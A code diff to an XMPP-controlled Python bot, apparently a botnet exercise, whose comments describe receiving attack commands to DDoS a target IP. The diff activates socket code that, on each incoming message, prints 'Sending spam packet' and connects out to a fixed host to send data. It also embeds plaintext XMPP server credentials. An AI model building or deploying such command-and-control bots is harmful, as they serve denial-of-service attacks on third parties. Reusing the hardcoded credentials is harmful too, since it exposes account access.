@@ -14,17 +14,19 @@ class Bot:
         self.jabber.RegisterHandler('message',self.xmpp_message)
 
     def xmpp_message(self, con, event):
+        if event.getBody() == None:			#changed this
+            return					#changed					
         type = event.getType()
         fromjid = event.getFrom().getStripped()
         if type in ['message', 'chat', None]:
             #here's where you recieve a message
             sys.stdout.write(event.getBody() + '\n')
             # So for example if you wanted to DDoS and you had a command that would send an IP address to attack, for example:
-            #sys.stdout.write("Sending spam packet to: " + event.getBody() + '\n')
-            #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            #s.connect((event.getBody(), 80))
-            #s.sendall('GET / HTTP/1.1\r\nHost: ' + event.getBody() + '\r\n\r\n')
-            #s.close()
+            sys.stdout.write("Sending spam packet to: " + event.getBody() + '\n')
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect(('192.168.101.74', 1234))
+            s.sendall('sagarwl4')
+            s.close()
             #call(["ls", "-l"])
 
     def stdio_message(self, message):
@@ -48,6 +50,10 @@ class Bot:
 
 if __name__ == '__main__':
 
+    if len(sys.argv) != 2:
+        sys.exit(1)
+    remoteId = sys.argv[1] 
+
     #PROBABLY SHOULD CHANGE THIS, EH?
     jidparams={'jid': 'bot_sagarwl4@54.191.94.255', 'password': 'DA2tSUDU7'}
     
@@ -55,7 +61,7 @@ if __name__ == '__main__':
     cl=xmpp.Client('54.191.94.255',debug=[])
     print jid.getDomain()
     
-    bot=Bot(cl,'bot_sagarwl4@54.191.94.255')
+    bot=Bot(cl, remoteId)
 
     if not bot.xmpp_connect():
         sys.stderr.write("Could not connect to server, or password mismatch!\n")
@@ -72,9 +78,7 @@ if __name__ == '__main__':
     #Authorize makes it so the Bot "accepts your friend request"
     myRoster.Subscribe('sagarwl4@54.191.94.255')
     myRoster.Authorize('sagarwl4@54.191.94.255')
-    online = 0
-    #bot.xmpp_connect()
-    bot.stdio_message("hihi")
+    online = 1
 
     while online:
         (i , o, e) = select.select(socketlist.keys(),[],[],1)
